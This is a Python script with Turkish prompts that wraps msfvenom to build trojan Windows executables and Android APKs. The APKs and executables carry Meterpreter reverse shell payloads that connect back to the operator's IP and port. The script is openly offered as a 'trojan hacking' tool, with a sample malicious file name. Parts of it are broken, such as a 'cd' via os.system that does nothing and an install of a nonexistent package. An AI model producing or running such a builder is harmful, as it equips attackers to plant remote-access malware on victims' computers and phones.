import time as t
import os
import pandas as pd

def kadrMSFVENOM():
    t.sleep(4)
    os.system("ifconfig")
    os.system("apt-get install figlet")
    os.system("figlet MSFVENOM TROJEN HACKING")
    os.system("figlet WINDOW AND ANDROID")
    
    print("""
    -----------PAYLOAD------------------
    
    ======================================
          A)    WINDOW
              
    ======================================
     1. ) windows/meterpreter/reverse_tcp
     2. ) windows/meterpreter/reverse_http
     3. ) windows/meterpreter/reverse_https
    
    ======================================
          B)    ANDROID
              
    ======================================
     1. ) android/meterpreter/reverse_tcp
     2. ) android/meterpreter/reverse_http
     3. ) android/meterpreter/reverse_https
    
    NOT: kalide ağ nat ağı değil köprü bağlaştırıcısı olmalı yoksa trojen işe yaramaz ...
    """)

    secim = input("LÜTFEN BİR A VE B DEĞERİ GİR: ")

    if secim == "A":
        print("WINDOW için Başlatılıyor...")
        t.sleep(3)
        
        LHOST = input("Lütfen geçerli bir IP girin (kendi IP'niz olacak): ")
        LPORT = input("Lütfen geçerli bir port girin (yaygın 4444 daha iyi sonuç alır): ")
        path = input("Dosya yolunu girin (/home/kali/downloads...): ")
        trojen_adi = input("exe uzantılı bir trojen adı girin (örnek: mallar.exe): ")

        secim2 = input("Lütfen bir payload seçimi yapın (1/2/3): ")
        
        if secim2 == "1":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {trojen_adi}")
        
        elif secim2 == "2":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p windows/meterpreter/reverse_http LHOST={LHOST} LPORT={LPORT} -f exe -o {trojen_adi}")
        
        elif secim2 == "3":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f exe -o {trojen_adi}")
    
    elif secim == "B":
        print("ANDROID için Başlatılıyor...")
        t.sleep(3)
        
        LHOST = input("Lütfen geçerli bir IP girin (kendi IP'niz olacak): ")
        LPORT = input("Lütfen geçerli bir port girin (yaygın 4444 daha iyi sonuç alır): ")
        path = input("Dosya yolunu girin (/home/kali/downloads...): ")
        trojen_adi = input("apk uzantılı bir trojen adı girin (örnek: mallar.apk): ")
        
        secim2 = input("Lütfen bir payload seçimi yapın (1/2/3): ")
        
        if secim2 == "1":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f apk -o {trojen_adi}")
        
        elif secim2 == "2":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p android/meterpreter/reverse_http LHOST={LHOST} LPORT={LPORT} -f apk -o {trojen_adi}")
        
        elif secim2 == "3":
            os.system(f"cd {path}")
            os.system("apt-get install msfvenom")
            print("Trojen oluşturuluyor, lütfen bekleyiniz...")
            for i in range(5):
                print("...")
                os.system("clear")
            t.sleep(3)
            os.system(f"msfvenom -p android/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f apk -o {trojen_adi}")

kadrMSFVENOM()
